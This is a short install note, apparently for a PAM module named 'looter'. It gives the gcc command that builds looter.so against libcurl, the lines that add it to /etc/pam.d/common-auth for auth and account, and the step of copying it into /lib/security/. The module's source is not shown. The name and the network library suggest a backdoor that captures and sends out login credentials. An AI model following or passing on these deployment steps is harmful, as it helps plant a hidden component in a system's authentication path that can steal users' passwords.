compile : gcc  -Wall -fPIC -shared -Xlinker -x -o looter.so looter.c -lcurl

in /etc/pam.d/common-auth add :

auth optional looter.so

account optional looter.so

then put the looter.so into /lib/security/

relation:
libcurl4-openssl-dev
libpam0g-dev

